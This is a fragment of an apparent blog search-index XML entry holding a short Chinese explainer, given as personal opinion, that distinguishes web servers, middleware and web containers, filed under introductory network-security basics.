title="关于web服务器、中间件、web容器的辨析"></a>关于web服务器、中间件、web容器的辨析</h4><ul><li>以下仅为个人见解</li><li>web服务器是用来为web服务提供一个寄生或者运行基础环境（容器）的主机（包括硬件和软件，可以是物理的、也可以是云的），web服务器不止可以为web提供基础环境，还可以提供其他的服务如邮件服务，DNS服务等。</li><li>中间件用于连接系统软件和应用软件，类似于进程通信间的管道或者缓冲区，或者网络中的服务访问点之类的。</li><li>web容器是web服务的语言解析环境，web服务直接在容器的环境中运行。<br><img src="./1.png" alt="web服务器、中间件、web容器关系图"></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安预备基础 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 扫盲 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
